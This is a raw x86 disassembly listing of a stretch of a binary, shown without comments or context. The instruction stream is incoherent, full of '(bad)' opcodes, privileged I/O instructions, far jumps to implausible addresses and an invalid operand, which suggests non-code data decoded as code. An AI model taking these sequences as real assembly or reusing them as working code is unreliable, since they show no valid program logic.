  40ad78:	pop    es
  40ad79:	repnz sti 
  40ad7b:	dec    esi
  40ad7c:	mov    al,ds:0xa890bcf4
  40ad81:	jo     0x40ad49
  40ad83:	inc    ecx
  40ad84:	fwait
  40ad85:	cdq    
  40ad86:	push   ecx
  40ad87:	push   cs
  40ad88:	xor    bl,BYTE PTR [ebp+0x2e332257]
  40ad8e:	push   es
  40ad8f:	pop    ecx
  40ad90:	jge    0x40adb0
  40ad92:	jge    0x40adda
  40ad94:	jbe    0x40ad7e
  40ad96:	xchg   edi,eax
  40ad97:	mov    cs,WORD PTR [esi]
  40ad99:	(bad)  
  40ad9a:	icebp  
  40ad9b:	cmc    
  40ad9c:	add    BYTE PTR [eax+0x21],ch
  40ad9f:	cmc    
  40ada0:	jo     0x40ad57
  40ada2:	xor    BYTE PTR ds:0xf693122a,dl
  40ada8:	cmp    al,0x58
  40adaa:	ins    DWORD PTR es:[edi],dx
  40adab:	push   ds
  40adac:	(bad)  [esi+0x49209e00]
  40adb2:	dec    esi
  40adb3:	inc    ebx
  40adb4:	mov    dh,BYTE PTR [edx]
  40adb6:	adc    bh,BYTE PTR [ebx+0x65]
  40adb9:	lahf   
  40adba:	ret    
  40adbb:	fxtract 
  40adbd:	fnstcw WORD PTR [ebx]
  40adbf:	rcr    DWORD PTR ds:0xf309e4f0,0xfb
  40adc6:	stc    
  40adc7:	inc    ebx
  40adc8:	mov    cl,0x6e
  40adca:	sub    edi,esp
  40adcc:	adc    al,0xf2
  40adce:	ja     0x40ae13
  40add0:	aaa    
  40add1:	or     eax,0x2ba7b116
  40add6:	xlat   BYTE PTR ds:[ebx]
  40add7:	mov    ecx,0xc6823201
  40addc:	loope  0x40ae1b
  40adde:	dec    ecx
  40addf:	sub    BYTE PTR [edi+edx*8-0x6a560a0f],bl
  40ade6:	stos   DWORD PTR es:[edi],eax
  40ade7:	push   ss
  40ade8:	mov    DWORD PTR [edi+0x520dff6d],0x8e3c5d1d
  40adf2:	xor    BYTE PTR [esp+edi*8-0x73],0xdf
  40adf7:	jo     0x40adf7
  40adf9:	ins    BYTE PTR es:[edi],dx
  40adfa:	bound  ecx,QWORD PTR [eax]
  40adfc:	repnz cli 
  40adfe:	adc    ecx,DWORD PTR [ebp-0x5351327c]
  40ae04:	xor    ebp,DWORD PTR [ebp-0x2d124984]
  40ae0a:	into   
  40ae0b:	mov    ch,0xce
  40ae0d:	xlat   BYTE PTR ds:[ebx]
  40ae0e:	jmp    0x40adc8
  40ae10:	in     al,0xaf
  40ae12:	xor    dh,BYTE PTR [edi]
  40ae14:	push   0xffffffc0
  40ae16:	clc    
  40ae17:	xor    BYTE PTR [ebp+0x4d27b39e],0x6d
  40ae1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae1f:	bound  esi,QWORD PTR [edx+0x4d]
  40ae22:	es mov al,0xf2
  40ae25:	aam    0xfd
  40ae27:	(bad)  
  40ae28:	lea    ebx,es:[eax]
  40ae2b:	fcom   DWORD PTR [eax]
  40ae2d:	pusha  
  40ae2e:	pop    ebx
  40ae2f:	out    dx,al
  40ae30:	stos   DWORD PTR es:[edi],eax
  40ae31:	aas    
  40ae32:	add    DWORD PTR [ebx+ebp*2+0x323ca114],ebp
  40ae39:	dec    esi
  40ae3a:	add    ch,BYTE PTR [edx-0xb]
  40ae3d:	push   ss
  40ae3e:	and    BYTE PTR [eax],ah
  40ae40:	imul   eax,DWORD PTR [edx+0x2f],0xffffff91
  40ae44:	pop    es
  40ae45:	lds    ebp,FWORD PTR [ecx]
  40ae47:	cwde   
  40ae48:	cld    
  40ae49:	adc    BYTE PTR ds:0x532713b3,ah
  40ae4f:	jg     0x40aece
  40ae51:	in     eax,0x25
  40ae53:	int    0xa
  40ae55:	inc    esi
  40ae56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae57:	stc    
  40ae58:	jg     0x40ae46
  40ae5a:	xchg   esi,eax
  40ae5b:	(bad)  
  40ae5d:	and    DWORD PTR [edi+0x7809d0ca],ecx
  40ae63:	xchg   edi,eax
  40ae64:	sub    dh,al
  40ae66:	push   es
  40ae67:	or     ah,BYTE PTR [edx]
  40ae69:	mov    bh,0xf6
  40ae6b:	cli    
  40ae6c:	cld    
  40ae6d:	ror    BYTE PTR [esi],0xb2
  40ae70:	popa   
  40ae71:	bound  ebx,QWORD PTR [ebx-0x51]
  40ae74:	pushf  
  40ae75:	pop    esp
  40ae76:	imul   ecx,edx,0x5dc0cd83
  40ae7c:	jmp    0x40ae8a
  40ae7e:	add    BYTE PTR [edi-0x55],dl
  40ae81:	out    dx,al
  40ae82:	jne    0x40aeed
  40ae84:	add    al,0x57
  40ae86:	sub    BYTE PTR [eax+0x33],0x3
  40ae8a:	pop    esi
  40ae8b:	or     ebx,DWORD PTR [ebx-0x22]
  40ae8e:	pop    edi
  40ae8f:	shr    BYTE PTR [edi+0x23addb23],1
  40ae95:	(bad)
  40ae98:	sub    al,bh
  40ae9a:	je     0x40aef8
  40ae9c:	or     BYTE PTR [edx],dl
  40ae9e:	jnp    0x40aeed
  40aea0:	pop    ebp
  40aea1:	test   DWORD PTR [ecx+ebx*8+0x48],ebp
  40aea5:	loopne 0x40aea3
  40aea7:	fidiv  DWORD PTR [edi+0x12]
  40aeaa:	int3   
  40aeab:	fs (bad) 
  40aead:	popa   
  40aeae:	loop   0x40ae47
  40aeb0:	jne    0x40ae9c
  40aeb2:	scas   eax,DWORD PTR es:[edi]
  40aeb3:	mov    al,ds:0x1a772be2
  40aeb8:	ss mov fs,edx
  40aebb:	dec    eax
  40aebc:	(bad)  
  40aebd:	out    dx,eax
  40aebe:	outs   dx,BYTE PTR ds:[esi]
  40aebf:	lods   eax,DWORD PTR ds:[esi]
  40aec0:	clc    
  40aec1:	mov    dh,0xd6
  40aec3:	push   eax
  40aec4:	adc    edi,DWORD PTR [eax+ebx*2]
  40aec7:	jo     0x40aebd
  40aec9:	(bad)  
  40aeca:	(bad)  
  40aecb:	cmp    BYTE PTR [edx+esi*1-0x91d7326],al
  40aed2:	pushf  
  40aed3:	mov    eax,ds:0x1fd9a83c
  40aed8:	mov    dh,0x5a
  40aeda:	mov    ds:0x6caa0ee9,al
  40aedf:	push   edi
  40aee0:	fdivr  st(1),st
  40aee2:	or     BYTE PTR [ebx+0x14],ch
  40aee5:	out    0xc4,al
  40aee7:	mov    edi,DWORD PTR [esi]
  40aee9:	jb     0x40aef5
  40aeeb:	sbb    bl,ah
  40aeed:	add    BYTE PTR [ebx+edx*8+0x7a],cl
  40aef1:	or     bh,BYTE PTR [edi+0x1c42d588]
  40aef7:	mov    eax,ds:0xd088fe6a
  40aefc:	les    ebp,FWORD PTR [edx+0x79528f63]
  40af02:	mov    ds:0xf1071510,eax
  40af07:	dec    ebx
  40af08:	ret    
  40af09:	iret   
  40af0a:	and    edi,DWORD PTR [eax]
  40af0c:	lods   al,BYTE PTR ds:[esi]
  40af0d:	jg     0x40af3e
  40af0f:	mov    bl,0x7d
  40af11:	jmp    0x7af3:0x608afdc3
  40af18:	push   esp
  40af19:	in     al,dx
  40af1a:	retf   
  40af1b:	call   0x1146af93
  40af20:	xor    al,0xb1
  40af22:	add    al,BYTE PTR [ecx-0x2f1c16cf]
  40af28:	jae    0x40af21
  40af2a:	adc    ebx,edi
  40af2c:	jecxz  0x40aedd
  40af2e:	xor    eax,0x27c8948
  40af33:	(bad)  
  40af34:	and    eax,0x8d6e07f0
  40af39:	cmp    DWORD PTR [edx+0x6c77560b],ebp
  40af3f:	jmp    0x40af23
  40af41:	cmp    eax,DWORD PTR [edx+0x1a07b44a]
  40af47:	jb     0x40aef0
  40af49:	iret   
  40af4a:	popf   
  40af4b:	add    DWORD PTR [ecx],ebp
  40af4d:	ins    BYTE PTR es:[edi],dx
  40af4e:	addr16 pop ecx
  40af50:	cmp    al,BYTE PTR ds:0xd87058f1
  40af56:	int    0x24
  40af58:	lods   eax,DWORD PTR ds:[esi]
  40af59:	mov    BYTE PTR [ecx+eiz*1],dh
  40af5c:	add    al,BYTE PTR [ebx+0x2f610c7e]
  40af62:	mov    esi,DWORD PTR [ecx-0x4f6bd440]
  40af68:	xchg   esp,eax
  40af69:	mov    ebx,0x38aeea4e
  40af6e:	xchg   edx,eax
  40af6f:	sub    ah,0xf3
  40af72:	dec    esp
  40af73:	sub    ebx,edx
  40af75:	adc    edx,DWORD PTR [edx-0x73b248ce]
  40af7b:	mov    al,ds:0x701cbaea
  40af80:	add    ecx,DWORD PTR [eax-0x5cc4c7f2]
  40af86:	in     al,0xda
  40af88:	push   esi
  40af89:	jl     0x40afc8
  40af8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af8c:	jge    0x40afbd
  40af8e:	pop    ebx
  40af8f:	retf   
  40af90:	or     dl,BYTE PTR [edi+esi*8-0x30dbb6dd]
  40af97:	imul   ebp,DWORD PTR [eax],0xffffffe0
  40af9a:	jl     0x40af55
  40af9c:	adc    dl,dl
  40af9e:	lds    ecx,FWORD PTR [ebx-0x17]
  40afa1:	lods   eax,DWORD PTR ds:[esi]
  40afa2:	jle    0x40afda
  40afa4:	or     DWORD PTR [eax],esp
  40afa6:	cli    
  40afa7:	les    esi,FWORD PTR [ecx+0x12]
  40afaa:	jno    0x40af61
  40afac:	sub    dh,dh
  40afae:	push   esp
  40afaf:	out    dx,eax
  40afb0:	lods   al,BYTE PTR ds:[esi]
  40afb1:	popf   
  40afb2:	stos   DWORD PTR es:[edi],eax
  40afb3:	dec    ecx
  40afb4:	pop    ebx
  40afb5:	push   cs
  40afb6:	ja     0x40afbf
  40afb8:	mov    BYTE PTR [ebp-0x2948aead],ah
  40afbe:	jb     0x40b01d
  40afc0:	cs mov dl,0x29
  40afc3:	dec    edx
  40afc4:	lock mov dh,0x58
  40afc7:	fidivr DWORD PTR [eax+0x61]
  40afca:	or     DWORD PTR [eax+eax*1-0x5],esp
  40afce:	mov    esi,0xfe04d170
  40afd3:	xchg   ebx,edi
  40afd5:	test   eax,0x39ed88ef
  40afda:	and    DWORD PTR [ecx-0x396bd856],ebx
  40afe0:	loopne 0x40b058
  40afe2:	pop    ecx
  40afe3:	mov    BYTE PTR [esi+0x32],dh
  40afe6:	mov    esi,0xf51d2c96
  40afeb:	sub    BYTE PTR [eax-0x3e],ah
  40afee:	mov    ecx,DWORD PTR [edx-0x6a2a4044]
  40aff4:	xchg   ecx,eax
  40aff5:	mov    ebx,0x530833e4
  40affa:	es out dx,eax
  40affc:	daa    
  40affd:	hlt    
  40affe:	ds pushw ds
  40b001:	fst    DWORD PTR [esi-0x37df4ad9]
  40b007:	call   0x1d6e611a
  40b00c:	xor    eax,0x4f32e7c6
  40b011:	jno    0x40b069
  40b013:	xchg   DWORD PTR [ecx+0x2bbe8aca],ecx
  40b019:	cmp    dl,BYTE PTR [edx-0x5358d211]
  40b01f:	fist   DWORD PTR [ecx]
  40b021:	mul    BYTE PTR [edx-0x9]
  40b024:	adc    al,0xf9
  40b026:	pop    ebp
  40b027:	or     ch,dh
  40b029:	shl    esp,1
  40b02b:	jmp    0xd63:0x38320802
  40b032:	fidiv  WORD PTR [ecx+ebp*4+0xe]
  40b036:	dec    edi
  40b037:	stos   DWORD PTR es:[edi],eax
  40b038:	sti    
  40b039:	mov    ecx,0x1dc3f5e
  40b03e:	out    0xbc,al
  40b040:	mov    dh,BYTE PTR [eax-0x4f193fb9]
  40b046:	shl    BYTE PTR [ebx+0x256e2b05],0xf0
  40b04d:	stos   BYTE PTR es:[edi],al
  40b04e:	add    al,0x68
  40b050:	mov    dh,BYTE PTR [esi-0x3f]
  40b053:	mov    ch,0x9a
  40b055:	call   0x5f62:0x62c4c692
  40b05c:	push   cs
  40b05d:	rcr    DWORD PTR [ecx],cl
  40b05f:	icebp  
  40b060:	out    dx,al
  40b061:	mov    cs,WORD PTR [ebp-0x61]
  40b064:	fneni(8087 only) 
  40b066:	fimul  DWORD PTR [eax-0x8c27ec4]
  40b06c:	push   es
  40b06d:	xor    eax,0xc312b775
  40b072:	mov    ch,0xba
  40b074:	mov    ?,WORD PTR [esi-0x1a]
  40b077:	push   ecx
  40b078:	sti    
  40b079:	sahf   
  40b07a:	or     BYTE PTR [edi],al
  40b07c:	fnstsw WORD PTR [edx+ebp*4]
  40b07f:	inc    ebp
  40b080:	inc    eax
  40b081:	cmp    eax,0x9d0df337
  40b086:	mov    al,ds:0xe014bbad
  40b08b:	xchg   ah,dl
  40b08d:	jno    0x40b057
  40b08f:	push   edx
  40b090:	push   cs
  40b091:	icebp  
  40b092:	inc    esi
  40b093:	lds    ebx,FWORD PTR [ebp+0x45]
  40b096:	ror    DWORD PTR [eax-0x47],0x5
  40b09a:	or     eax,0xee2e3e0d
  40b09f:	lock arpl WORD PTR [eax-0x77],di
  40b0a3:	sub    BYTE PTR ds:0x82ca17ed,al
  40b0a9:	or     edx,DWORD PTR [ebx-0x69]
  40b0ac:	into   
  40b0ad:	imul   edi,esp,0xffffff9a
  40b0b0:	xchg   ebx,eax
  40b0b1:	(bad)  
  40b0b2:	push   edi
  40b0b3:	pop    ebp
  40b0b4:	leave  
  40b0b5:	cmp    bl,BYTE PTR [ebp+0x2a0b4445]
  40b0bb:	ja     0x40b054
  40b0bd:	loope  0x40b075
  40b0bf:	lock rcr BYTE PTR [esi+0x35],cl
  40b0c3:	xchg   edx,eax
  40b0c4:	jnp    0x40b08d
  40b0c6:	retf   0x997a
  40b0c9:	dec    eax
  40b0ca:	(bad)  
  40b0cb:	enter  0xf9d,0xa0
  40b0cf:	(bad)  
  40b0d0:	in     al,dx
  40b0d1:	aam    0x4e
  40b0d3:	dec    ebx
  40b0d4:	out    dx,eax
  40b0d5:	cld    
  40b0d6:	pop    es
  40b0d7:	mov    dh,0xf4
  40b0d9:	mov    dl,0x62
  40b0db:	icebp  
  40b0dc:	xchg   ebp,eax
  40b0dd:	inc    esp
  40b0de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0df:	sub    eax,0xd4a995c6
  40b0e4:	adc    eax,0x3d063ab4
  40b0e9:	add    BYTE PTR [esi-0x59],dh
  40b0ec:	pop    ebx
  40b0ed:	dec    edx
  40b0ee:	jo     0x40b10c
  40b0f0:	fstp   TBYTE PTR [eax]
  40b0f2:	cmp    bh,al
  40b0f4:	push   ecx
  40b0f5:	push   cs
  40b0f6:	push   esi
  40b0f7:	dec    ebx
  40b0f8:	leave  
  40b0f9:	inc    ecx
  40b0fa:	pop    ebx
  40b0fb:	fwait
  40b0fc:	xchg   edx,eax
  40b0fd:	push   cs
  40b0fe:	iret   
  40b0ff:	xlat   BYTE PTR ds:[ebx]
  40b100:	es repz aaa 
  40b103:	dec    edx
  40b104:	mov    ds:0x2bd3494d,al
  40b109:	ror    BYTE PTR [ebx],1
  40b10b:	mov    BYTE PTR [ebp+0x5368c6e5],bh
  40b111:	xchg   edi,eax
  40b112:	loope  0x40b13f
  40b114:	push   ecx
  40b115:	adc    ch,BYTE PTR [esi-0xc]
  40b118:	sub    al,0xb4
  40b11a:	(bad)  
  40b11b:	mov    esp,0xcd516f66
  40b120:	das    
  40b121:	jmp    0xea8b383d
  40b126:	fisubr DWORD PTR cs:[edx]
  40b129:	call   0xf2405334
  40b12e:	les    esp,FWORD PTR [ecx+0x2b]
  40b131:	jno    0x40b126
  40b133:	add    DWORD PTR [edi+0x6a],ecx
  40b136:	jno    0x40b0ea
  40b138:	lods   al,BYTE PTR ds:[esi]
  40b139:	adc    edx,DWORD PTR [edi+ecx*4+0x2b]
  40b13d:	cdq    
  40b13e:	shl    BYTE PTR [ebp-0xa68f4db],1
  40b144:	hlt    
  40b145:	(bad)  
  40b146:	(bad)  
  40b147:	mov    edx,0x895375d6
  40b14c:	sub    DWORD PTR [ebx],ecx
  40b14e:	fdiv   QWORD PTR [ecx+0x6b30ec05]
  40b154:	fidiv  WORD PTR [ecx]
  40b156:	hlt    
  40b157:	adc    dl,BYTE PTR es:[edi+0x41c80f03]
  40b15e:	fisub  DWORD PTR [edx]
  40b160:	test   BYTE PTR [ebp-0x71],dh
  40b163:	pop    edx
  40b164:	ss clc 
  40b166:	jp     0x40b12d
  40b168:	pushf  
  40b169:	push   ebx
  40b16a:	and    al,0x72
  40b16c:	rcr    BYTE PTR [ebp+0x5c5d4e90],cl
  40b172:	je     0x40b158
  40b174:	jg     0x40b12c
  40b176:	mov    al,0x61
  40b178:	inc    eax
  40b179:	inc    edx
  40b17a:	mov    al,ds:0x84efdb92
  40b17f:	das    
  40b180:	add    eax,0x652483d5
  40b185:	mov    cl,0xb5
  40b187:	lea    ebp,[ecx+0x47]
  40b18a:	jecxz  0x40b19f
  40b18c:	jl     0x40b13d
  40b18e:	stc    
  40b18f:	leave  
  40b190:	test   DWORD PTR [edx-0x708c3966],ecx
  40b196:	aad    0xc1
  40b198:	xor    BYTE PTR [edx-0x17667f2e],bl
  40b19e:	dec    eax
  40b19f:	jge    0x40b183
  40b1a1:	add    eax,0x307e3ed1
  40b1a6:	clc    
  40b1a7:	dec    DWORD PTR [ecx-0x7f]
  40b1aa:	mov    eax,0xe81259ac
  40b1af:	jg     0x40b1e3
  40b1b1:	rcl    bl,cl
  40b1b3:	inc    edi
  40b1b4:	std    
  40b1b5:	repnz std 
  40b1b7:	shl    DWORD PTR [edi-0x66e547ed],0x6a
  40b1be:	out    0x68,al
  40b1c0:	(bad)
  40b1c3:	fist   DWORD PTR [eax+0x1c]
  40b1c6:	push   0x2a
  40b1c8:	adc    BYTE PTR [edi],bh
  40b1ca:	and    al,0x33
  40b1cc:	test   al,0x61
  40b1ce:	jg     0x40b1e5
  40b1d0:	or     BYTE PTR [ebp+0x4ec14215],al
  40b1d6:	int    0xc
  40b1d8:	jmp    0x7dbb:0xb37ef23d
  40b1df:	jle    0x40b236
  40b1e1:	or     al,0xa6
  40b1e3:	sub    DWORD PTR [ecx-0x7bfa3913],ecx
  40b1e9:	xchg   BYTE PTR [ebp+0x2b],ch
  40b1ec:	pop    ebp
  40b1ed:	paddd  mm1,QWORD PTR [edi]
  40b1f0:	mov    ah,BYTE PTR [esi-0x63ee22a8]
  40b1f6:	push   esp
  40b1f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1f8:	and    bh,BYTE PTR [esi-0x39de1533]
  40b1fe:	xchg   edx,eax
  40b1ff:	mov    eax,ds:0xbdf8d7e2
  40b204:	xor    ecx,DWORD PTR [ebp+edi*1-0x19acd5dc]
  40b20b:	(bad)  
  40b20d:	ja     0x40b259
  40b20f:	or     eax,0xce0d79d5
  40b214:	(bad)  
  40b216:	mov    eax,0x47844561
  40b21b:	push   ebx
  40b21c:	xchg   edx,eax
  40b21d:	gs popf 
  40b21f:	cmp    dl,ch
  40b221:	mov    ebp,0x75cc5998
  40b226:	(bad)  
  40b228:	add    DWORD PTR [edx],0x33
  40b22b:	fimul  DWORD PTR [ebx-0x3a]
  40b22e:	cmp    al,0xb4
  40b230:	add    BYTE PTR [ebx-0x1f380dc4],ch
  40b236:	aaa    
  40b237:	add    edi,0xd0f605bb
  40b23d:	sahf   
  40b23e:	push   0x787fc4f5
  40b243:	xor    esi,edi
  40b245:	mov    al,0x5c
  40b247:	jno    0x40b1cb
  40b249:	inc    edi
  40b24a:	cmp    BYTE PTR [edx-0x2d72c741],0x85
  40b251:	rol    DWORD PTR [esi],1
  40b253:	inc    edx
  40b254:	pop    ebx
  40b255:	adc    al,0x46
  40b257:	daa    
  40b258:	fist   WORD PTR ds:[esi-0x2158657a]
  40b25f:	pop    es
  40b260:	jmp    0xe96d:0x6e0c742b
  40b267:	clc    
  40b268:	jl     0x40b2d0
  40b26a:	out    0xae,al
  40b26c:	(bad)  
  40b26f:	pop    es
  40b270:	add    BYTE PTR [esi-0x6e459a30],al
  40b276:	jecxz  0x40b2ed
  40b278:	aad    0x54
  40b27a:	xchg   ebx,eax
  40b27b:	data16 sub al,0xa3
  40b27e:	shr    esi,0x70
  40b281:	push   esi
  40b282:	cmp    bh,bl
  40b284:	es lock shr ch,cl
  40b288:	add    eax,0x8a1494ac
  40b28d:	repz dec esp
  40b28f:	jmp    0x176ec2cc
  40b294:	ret    
  40b295:	mov    esp,0xb555e7cb
  40b29a:	inc    BYTE PTR [edi+0x353d63e5]
  40b2a0:	xor    eax,0xe1162225
  40b2a5:	ror    DWORD PTR [edi],1
  40b2a7:	lea    ebx,[edx+0x63]
  40b2aa:	sbb    BYTE PTR [ebx],bh
  40b2ac:	and    al,0xc6
  40b2ae:	adc    eax,0x1d9fa4c5
  40b2b3:	pop    ecx
  40b2b4:	fwait
  40b2b5:	ret    0x1787
  40b2b8:	sahf   
  40b2b9:	mov    edx,0x3f05337e
  40b2be:	add    DWORD PTR [eax-0x7a8624d2],esp
  40b2c4:	sub    al,0x63
  40b2c6:	shr    al,cl
  40b2c8:	nop
  40b2c9:	or     eax,0xb73b6f53
  40b2ce:	(bad)  
  40b2cf:	daa    
  40b2d0:	repnz mov cl,0x49
  40b2d3:	test   al,0xcd
  40b2d5:	hlt    
  40b2d6:	out    dx,eax
  40b2d7:	sbb    ebp,DWORD PTR [edx-0x1c38bea2]
  40b2dd:	add    al,0xd6
  40b2df:	test   al,0xea
  40b2e1:	mov    DWORD PTR [edi],ecx
  40b2e3:	scas   al,BYTE PTR es:[edi]
  40b2e4:	out    0xd9,eax
  40b2e6:	mov    eax,0xe519246a
  40b2eb:	inc    eax
  40b2ec:	shl    BYTE PTR [ecx+0x47],0x97
  40b2f0:	cmp    bh,BYTE PTR [eax-0x5a]
  40b2f3:	int    0xa8
  40b2f5:	add    al,0x3
  40b2f7:	jmp    0xbf424c3
  40b2fc:	push   0xa4137eee
  40b301:	test   DWORD PTR [edx],edi
  40b303:	fisub  WORD PTR [ebp+0x64]
  40b306:	cmp    ebx,0xe7f46f3a
  40b30c:	test   al,0x18
  40b30e:	cmp    DWORD PTR [edi-0x53],ebx
  40b311:	iret   
  40b312:	add    ah,BYTE PTR [esi+0x2c]
  40b315:	sar    BYTE PTR [edx+0x70e1023d],cl
  40b31b:	push   0xb04611b4
  40b320:	xor    dh,BYTE PTR [edx+edx*1]
  40b323:	aas    
  40b324:	jnp    0x40b2d5
  40b326:	pop    es
  40b327:	xchg   ebx,eax
  40b328:	mov    ebx,0x5e38ad4d
  40b32d:	sbb    BYTE PTR [ecx],0xf5
  40b330:	xchg   ecx,eax
  40b331:	inc    esi
  40b332:	or     eax,0xd8f94195
  40b337:	push   ecx
  40b338:	dec    eax
  40b339:	sbb    eax,0x4526bfeb
  40b33e:	xsha1  (bad)
  40b33f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b340:	push   cs
  40b341:	pop    ds
  40b342:	push   ecx
  40b343:	fld    QWORD PTR [ecx+0x29]
  40b346:	or     eax,0x7ed25cd3
  40b34b:	shr    DWORD PTR [edx],cl
  40b34d:	pop    esp
  40b34e:	xchg   edx,eax
  40b34f:	and    eax,0xf62359c5
  40b354:	sbb    DWORD PTR [esi-0x15],edx
  40b357:	pop    es
  40b358:	pusha  
  40b359:	retf   0x5a62
  40b35c:	loope  0x40b394
  40b35e:	popf   
  40b35f:	jae    0x40b312
  40b361:	repz lahf 
  40b363:	pusha  
  40b364:	mov    cl,0x1f
  40b366:	shl    DWORD PTR [ebp-0x23d3329e],0x22
  40b36d:	jbe    0x40b301
  40b36f:	in     eax,0x59
  40b371:	daa    
  40b372:	out    dx,al
  40b373:	popa   
  40b374:	or     eax,DWORD PTR [edi-0x4d]
  40b377:	pop    ds
  40b378:	sbb    bl,0x82
  40b37b:	dec    eax
  40b37c:	add    ebx,esi
  40b37e:	in     eax,0x46
  40b380:	arpl   bp,cx
  40b382:	aas    
  40b383:	adc    edx,DWORD PTR [ebx+0x1bfec35c]
  40b389:	(bad)  
  40b38a:	(bad)  
  40b38b:	jle    0x40b374
  40b38d:	xchg   ebx,eax
  40b38e:	popf   
  40b38f:	cli    
  40b390:	and    DWORD PTR [ebx-0x15],edi
  40b393:	loop   0x40b38a
  40b395:	adc    bh,BYTE PTR [edi+0x24335ab6]
  40b39b:	pop    edx
  40b39c:	mov    cl,0x13
  40b39e:	sahf   
  40b39f:	or     BYTE PTR [esi+ecx*4-0x17],0xc5
  40b3a4:	call   0x227f:0x8172126d
  40b3ab:	and    DWORD PTR [esi],esp
  40b3ad:	inc    edx
  40b3ae:	xchg   ecx,eax
  40b3af:	clc    
  40b3b0:	mov    edi,0xa1ce9b7f
  40b3b5:	push   edx
  40b3b6:	inc    DWORD PTR [ebp-0x2f30e12c]
  40b3bc:	push   cs
  40b3bd:	xor    eax,0xda8e2a2c
  40b3c2:	rcr    BYTE PTR ds:0xeab27b5f,0x4d
  40b3c9:	lock pushf 
  40b3cb:	cmp    dl,BYTE PTR [edi+0xb]
  40b3ce:	push   esp
  40b3cf:	dec    ebp
  40b3d0:	lahf   
  40b3d1:	(bad)  
  40b3d2:	lods   al,BYTE PTR ds:[esi]
  40b3d3:	popa   
  40b3d4:	xor    BYTE PTR [eax],cl
  40b3d6:	pop    esi
  40b3d7:	xor    eax,DWORD PTR [edx-0x78]
  40b3da:	jae    0x40b38c
  40b3dc:	imul   esi,DWORD PTR [ecx],0x41
  40b3df:	fmul   DWORD PTR ds:0x8c5707ce
  40b3e5:	cmp    BYTE PTR [edi+0x1f2803d6],ah
  40b3eb:	out    dx,eax
  40b3ec:	xor    BYTE PTR [ebp-0x64478900],bl
  40b3f2:	sbb    bl,al
  40b3f4:	fbstp  TBYTE PTR [edx]
  40b3f6:	mov    edx,0x297498c5
  40b3fb:	cwde   
  40b3fc:	jb     0x40b3a4
  40b3fe:	scas   al,BYTE PTR es:[edi]
  40b3ff:	xor    ebp,DWORD PTR [ecx+ecx*8+0x5aab1e2c]
  40b406:	ja     0x40b44b
  40b408:	mov    ecx,0xc48aecbb
  40b40d:	jnp    0x40b42e
  40b40f:	retf   
  40b410:	imul   ecx,DWORD PTR [edx-0x56de8eeb],0xa8be341e
  40b41a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b41b:	or     BYTE PTR [edx+0x3dffcdec],dl
  40b421:	in     al,0x6c
  40b423:	mov    ds,WORD PTR [ebx]
  40b425:	and    eax,0xc42af25e
  40b42a:	pop    edi
  40b42b:	cmp    eax,0x55d9bf11
  40b430:	xlat   BYTE PTR ds:[ebx]
  40b431:	adc    ecx,ecx
  40b433:	sub    eax,0x90b081dd
  40b438:	int    0x90
  40b43a:	repz das 
  40b43c:	nop
  40b43d:	or     eax,0x8728f9e5
  40b442:	test   BYTE PTR [esp+eax*2+0x5c27fda0],dh
  40b449:	dec    edx
  40b44a:	and    bl,ah
  40b44c:	test   bl,ch
  40b44e:	mov    al,0x32
  40b450:	mov    edx,0xafbcd446
  40b455:	ja     0x40b4c7
  40b457:	lea    ebx,[edx-0x2c]
  40b45a:	xchg   DWORD PTR [ebp+0x3d12b0c2],edi
  40b460:	loope  0x40b3e7
  40b462:	sbb    cl,BYTE PTR [ecx-0x2c]
  40b465:	es test dh,0x5b
  40b469:	adc    BYTE PTR [ecx+0x5e66af63],cl
  40b46f:	sub    BYTE PTR [ebp+0x6cbb70c0],cl
  40b475:	dec    esi
  40b476:	bound  edi,QWORD PTR [edx+0x3e]
  40b479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b47a:	jns    0x40b4e2
  40b47c:	sbb    DWORD PTR [eax],edi
  40b47e:	(bad)  
  40b47f:	scas   eax,DWORD PTR es:[edi]
  40b480:	cmp    al,0x1d
  40b482:	sub    eax,DWORD PTR [eax-0x40]
  40b485:	daa    
  40b486:	push   ebp
  40b487:	and    ebx,edi
  40b489:	gs pop edi
  40b48b:	retf   0x5fc8
  40b48e:	mov    ch,0xee
  40b490:	mov    BYTE PTR [ecx-0x58d1dd05],bh
  40b496:	sub    al,0x47
  40b498:	jecxz  0x40b4dc
  40b49a:	cmp    al,0x3e
  40b49c:	pop    es
  40b49d:	int    0xfe
  40b49f:	imul   edi,edx,0x13e62a4a
  40b4a5:	sbb    BYTE PTR [esi-0x750b8269],cl
  40b4ab:	or     eax,0x47286ed5
  40b4b0:	fxch   st(5)
  40b4b2:	imul   edx,DWORD PTR [ebx-0x51],0x77394be
  40b4b9:	sub    ch,BYTE PTR [ebp+0x433657e4]
  40b4bf:	add    BYTE PTR [ebx],bl
  40b4c1:	inc    ebx
  40b4c2:	fst    st(4)
  40b4c4:	mov    cl,0x37
  40b4c6:	lahf   
  40b4c7:	mov    ch,0xb5
  40b4c9:	dec    ebp
  40b4ca:	push   esp
  40b4cb:	mov    ds:0xf455b9de,eax
  40b4d0:	mov    ds:0x809d06b4,eax
  40b4d5:	mov    ecx,DWORD PTR [ebx-0x25]
  40b4d8:	loope  0x40b46d
  40b4da:	loope  0x40b46c
  40b4dc:	jmp    0xf94d:0xb0741a16
  40b4e3:	xchg   DWORD PTR [edx-0x15],eax
  40b4e6:	push   cs
  40b4e7:	iret   
  40b4e8:	add    BYTE PTR [edi],al
  40b4ea:	add    BYTE PTR [ecx+esi*4+0x66],dl
  40b4ee:	popf   
  40b4ef:	adc    ah,al
  40b4f1:	jns    0x40b4bc
  40b4f3:	cmc    
  40b4f4:	fisub  DWORD PTR [ebp+0x4bbea330]
  40b4fa:	xor    DWORD PTR [edx],eax
  40b4fc:	loope  0x40b493
  40b4fe:	je     0x40b4ae
  40b500:	pop    ecx
  40b501:	add    ah,bl
  40b503:	cs shl bh,1
  40b506:	mov    esp,0x15399d73
  40b50b:	jp     0x40b573
  40b50d:	jno    0x40b522
  40b50f:	xchg   BYTE PTR [ecx],bl
  40b511:	push   ecx
  40b512:	shr    DWORD PTR [edi+edx*4],cl
  40b515:	jp     0x40b576
